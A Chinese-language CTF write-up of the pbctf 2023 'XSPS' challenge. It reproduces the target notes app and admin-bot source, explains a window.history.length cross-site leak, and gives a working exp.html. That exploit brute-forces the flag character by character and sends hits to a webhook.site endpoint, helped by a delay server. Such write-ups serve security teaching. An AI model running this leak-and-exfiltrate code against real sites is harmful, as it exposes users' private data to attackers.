---
title: "pbctf 2023 XSPS Writeup"
date: 2023-02-20T20:17:29+08:00
lastmod: 2023-02-20T20:17:29+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

人生第一道 xsleaks, 感觉挺有意思的

不太会写 js 所以痛失一血 ()

<!--more-->

## XSPS

app.py

```python
from flask import Flask, request, session, jsonify, Response, make_response, g
import json
import redis
import random
import os
import binascii
import time

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "tops3cr3t")

app.config.update(
    SESSION_COOKIE_SECURE=False,
    SESSION_COOKIE_HTTPONLY=True,
    # SESSION_COOKIE_SAMESITE='Lax',
)

HOST = os.environ.get("CHALL_HOST", "localhost:5000")

r = redis.Redis(host='redis')

@app.route("/do_report", methods=['POST'])
def do_report():
    cur_time = time.time()
    ip = request.headers.get('X-Forwarded-For').split(",")[-2].strip() #amazing google load balancer

    last_time = r.get('time.'+ip) 
    last_time = float(last_time) if last_time is not None else 0
    
    time_diff = cur_time - last_time

    if time_diff > 6:
        r.rpush('submissions', request.form['url'])
        r.setex('time.'+ip, 60, cur_time)
        return "submitted"

    return "rate limited"

@app.route("/report", methods=['GET'])
def report():
    return """
<head>
    <title>Notes app</title>
</head>
<body>
    <h3><a href="/note">Get Note</a>&nbsp;&nbsp;&nbsp;<a href="/">Change Note</a>&nbsp;&nbsp;&nbsp;<a href="/report">Report Link</a></h3>
        <hr>
        <h3>Please report suspicious URLs to admin</h3>
        <form action="/do_report" id="reportform" method=POST>
        URL: <input type="text" name="url" placeholder="URL">
        <br>
        <input type="submit" value="submit">
        </form>
    <br>
</body>
    """

@app.before_request
def rand_nonce():
    g.nonce = binascii.b2a_hex(os.urandom(15)).decode()

@app.after_request
def add_CSP(response):
    response.headers['Content-Security-Policy'] = f"default-src 'self'; script-src 'nonce-{g.nonce}'"
    return response


@app.route('/add_note', methods=['POST'])
def add():
    if 'notes' not in session:
        session['notes'] = {}
    session['notes'][request.form['name']] = request.form['data']
    if 'highlight_note' in request.form and request.form['highlight_note'] == "YES":
        session['highlighted_note'] = request.form['name']

    session.modified = True
    return "Changed succesfully"


@app.route('/notes')
def notes():
    if 'notes' not in session:
        return []
    return [X for X in session['notes']] 

@app.route("/highlighted_note")
def highlighted_note():
    if 'highlighted_note' not in session:
        return {'name':False}
    return session['highlighted_note']

@app.route('/note/<path:name>')
def get_note(name):
    if 'notes' not in session:
        return ""
    if name not in session['notes']:
        return ""
    return session['notes'][name]

@app.route('/static/<path:filename>')
def static_file(filename):
    return send_from_directory('static', filename)

@app.route('/')
def index():
    return f"""
<head>
    <title>Notes app</title>
</head>
<body>
    <script nonce='{g.nonce}' src="/static/js/main.js"></script>

    <h3><a href="/report">Report Link</a></h3>
        <hr>
        <h3> Highlighted Note </h3>
        <div id="highlighted"></div>
        <hr>
        <h3> Add a note </h3>
        <form action="/add_note" id="noteform" method=POST>
        <input type=text name="name" placeholder="Note's name">
        <br>
        <br>
        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content"></textarea>
        <br>
        <br>
        <input type="checkbox" name="highlight_note" value="YES">
        <label for="vehicle1">Highlight Note</label><br>
        <br>
        <input type="submit" value="submit">
        </form>
    <hr>
    <h3>Search Note</h3>
    <a id=search_result></a>
    <input id='search_content' type=text name="name" placeholder="Content to search">
        <input id='search_open' type="checkbox" name="open_after" value="YES">
        <label for="open">Open</label><br>
    <br>
    <input id='search_button' type="submit" value="submit">

</body>
    """
```

/static/main.js

```javascript
window.onload = async function(){
    //init
    document.body.highlighted_note = await get_higlighted_note();
    document.body.search_result = document.getElementById('search_result');
    document.body.search_content = document.getElementById('search_content')
    document.body.search_open = document.getElementById('search_open')

    //highlight note
    document.getElementById('highlighted').innerHTML = document.body.highlighted_note;

    //search handler
    document.getElementById('search_button').onclick = search_click;
}

async function search_click(){
    search_name({'query':document.body.search_content.value, 'open' : document.body.search_open.checked})
}

window.addEventListener('hashchange', async function(){
    let search_query = JSON.parse(atob(location.hash.substring(1)));
    search_name(search_query);
});

async function search_name(search_data){
    let should_open = search_data['open']
    let query = search_data['query']

    let notes = await get_all_notes();

    let found_note = notes.find((val) => val.note.toString().startsWith(query));
    if(found_note == undefined){
        document.body.search_result.href = '';
        document.body.search_result.text = 'NOT FOUND'
        document.body.search_result.innerHTML += '<br>'
    }

    document.body.search_result.href = `note/${found_note.name}`;
    document.body.search_result.text = 'FOUND'
    document.body.search_result.innerHTML += '<br>'
    if(should_open)document.body.search_result.click();
}

async function get_all_notes(){
    return await Promise.all((await (await fetch('/notes')).json()).map(async (name) => ({'name':name, 'note': (await get_note(name))})))
}

async function get_higlighted_note(){
    return get_note((await (await fetch('/highlighted_note')).text()));
}

async function get_note(name){
    return (await (await fetch(`/note/${name}`)).text());
}
```

admin bot.js

```javascript
const redis = require('redis');
const r = redis.createClient({
    socket: {
        port      : 6379,               // replace with your port
        host      : 'redis',        // replace with your hostanme or IP address
    }})

const puppeteer = require('puppeteer');

async function browse(url){

    console.log(`Browsing -> ${url}`);
    const browser = await (await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-gpu'],
        executablePath: "/usr/bin/google-chrome"
    })).createIncognitoBrowserContext();

    const page = await browser.newPage();
    await page.setCookie({
        name: 'session',
        value: process.env.CHALL_COOKIE,
        domain: process.env.CHALL_HOST
    });

    try {
        const resp = await page.goto(url, {
            waitUntil: 'load',
            timeout: 20 * 1000,
        });
    } catch (err){
        console.log(err);
    }

    await page.close();
    await browser.close();

    console.log(`Done visiting -> ${url}`)

}

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

async function main() {
  try {
    const submit_url = await r.blPop(
      redis.commandOptions({ isolated: true }),
      "submissions",
      0
    );
    let url = submit_url.element;
    await browse(url);
  } catch (e) {
    console.log("error");
    console.log(e);
  }
  main();
}

async function conn(){
    await r.connect();
}

console.log("XSS Bot ready");
conn();
main()
```

/static/main.js 中有这么一段

```javascript
window.addEventListener('hashchange', async function(){
    let search_query = JSON.parse(atob(location.hash.substring(1)));
    search_name(search_query);
});

async function search_name(search_data){
    let should_open = search_data['open']
    let query = search_data['query']

    let notes = await get_all_notes();

    let found_note = notes.find((val) => val.note.toString().startsWith(query));
    if(found_note == undefined){
        document.body.search_result.href = '';
        document.body.search_result.text = 'NOT FOUND'
        document.body.search_result.innerHTML += '<br>'
    }

    document.body.search_result.href = `note/${found_note.name}`;
    document.body.search_result.text = 'FOUND'
    document.body.search_result.innerHTML += '<br>'
    if(should_open)document.body.search_result.click();
}
```

然后题目给的 `docker-compose.yml` 里面有一段测试用的 cookie, decode 之后就是一条名字为 flag 的 note

而且前端界面很明显存在一个模糊查找 note 的功能, 查找的结果根据当前用户的 note 列表会有所差别, 基本上满足了 xsleaks 的条件

首先 search 之后根据 `should_open` 的值来决定在查到 note 之后是否进行自动跳转, 这个操作本身就很可疑

众所周知在 JavaScript 中存在一个 `window.history` 对象, 它的 length 属性表明当前窗口访问页面的历史记录的数量

举个例子

```html
<script>
    let param = new URLSearchParams(location.search); // ?leak=pbctf
    let data = {'query': param.get('leak'), 'open': true};
    let text = btoa(JSON.stringify(data)).replaceAll('=', '');
    let w = window.open('http://xsps.chal.perfect.blue/'); // 先跳转到根页面再去改变 hash, 直接改的话 js 那边无法接收
    setTimeout(() => {
        w.location = 'http://xsps.chal.perfect.blue/#' + text;
    }, 1000);
    setTimeout(() => {
        w.location = 'about:blank';
    }, 2000);
    setTimeout(() => {
        console.log(w.history.length);
    }, 3000)
</script>
```

当我们查到 flag 时, `w.history.length` 的值就会变成 `4`, 跳转流程如下

```
1. http://xsps.chal.perfect.blue/
2. http://xsps.chal.perfect.blue/#<base64-content> (found)
3. http://xsps.chal.perfect.blue/note/flag
4. about:blank
```

查不到的情况下值就会变成 `3`

```
1. http://xsps.chal.perfect.blue/
2. http://xsps.chal.perfect.blue/#<base64-content> (not found)
3. about:blank
```

所以我们可以利用 `w.history.length` 的结果差异去 leak flag

然后这里用 `about:blank` 页面是为了绕过同源策略的限制, 不然的话无法得到 `w.history.length` 的值

[https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#inherited_origins](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#inherited_origins)

因为用 `window.open()` 打开的 `about:blank` 页面会继承父窗口的源, 所以这样才能保证四次跳转之后 exp server 和子窗口是同源的

然后 bot 那边有 20s 的时间限制

```javascript
try {
    const resp = await page.goto(url, {
        waitUntil: 'load',
        timeout: 20 * 1000,
    });
} catch (err){
    console.log(err);
}

await page.close();
await browser.close();
```

但测试后发现实际上 puppeteer 在加载完 dom 之后就会立刻 close, 远远没有达到 20s, 所以需要一个 delay server

```python
from flask import Flask
import time

app = Flask(__name__)

@app.route('/delay')
def delay():
	time.sleep(20)
	return "ok"

if __name__ == '__main__':
	app.run('0.0.0.0', '65333', debug=False, ssl_context=('/home/ubuntu/web/ssl/exp10it.cn/exp10it.cn_bundle.crt', '/home/ubuntu/web/ssl/exp10it.cn/exp10it.cn.key'))
```

当时比赛的时候 exp server, delay server 和 webhook server 都弄了 https 协议, 因为题目附件给的 bot 里面的 cookie 加上了 `Secure` 属性

后来才发现附件改了一次.... `Secure` 属性被删掉了, 不然不能够向外发送请求

最终 exp.html 如下

```html
<script>
    function xsleaks(leak) {
        let data = {'query': leak, 'open': true};
        let text = btoa(JSON.stringify(data)).replaceAll('=', '');
        let w = window.open('http://xsps.chal.perfect.blue/');
        fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?process=' + leak.slice(-1).charCodeAt());
        // fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?openwindow');
        setTimeout(() => {
            w.location = 'http://xsps.chal.perfect.blue/#' + text;
            // fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?requesthash');
            setTimeout(() => {
                w.location = 'about:blank';
                // fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?aboutblank');
                setTimeout(() => {
                    // fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?historylength=' + w.history.length);
                    console.log(w.history.length);
                    if (w.history.length == 4) {
                        fetch('https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?leak=', {
                            method: 'POST',
                            body: leak
                        }).catch((msg) => {});
                    }
                    w.close();
                }, 500)
            }, 500);
        }, 500);
    }

    let param = new URLSearchParams(location.search);
    let start = param.get('start');

    // xsleaks('pbctf');

    let sleepTime = 0;
    for (let i = start; i <= 127; i ++) {
        let c = String.fromCharCode(i);
        setTimeout(xsleaks, sleepTime, 'pbctf{' + c);
        sleepTime += 1500;
    }

</script>

<img src="https://exp10it.cn:65333/delay" />
```

平均每次 report url 能爆破 12 个字符, 当 webhook server 那边接收到 post 请求的时候就说明已经 leak 出来了部分 flag, 然后修改源码继续 leak 下一位

不太会写 js 所以完全就是半手动 leak 的 (躺), 大约两个小时出结果

flag: `pbctf{V_5w33p1ng_n0t3s_und3r_4_r4d10_s1l3nT_RuG}`

后来在 discord 看到 huli 师傅的 exp 才发现可以用 await 实现 sleep (XD)

[https://discord.com/channels/748672086838607943/1075589736674119692/1077047667206668309](https://discord.com/channels/748672086838607943/1075589736674119692/1077047667206668309)

```javascript
async function sleep(ms) {
    return new Promise((r) => setTimeout(r, ms));
}

async function main() {
    console.log('aaa');
    await sleep(1000);
    console.log('bbb');
}

main();
```

最后无论那种 exp 都会存在 20s 限制的问题, 所以不可避免地都要去多次 report url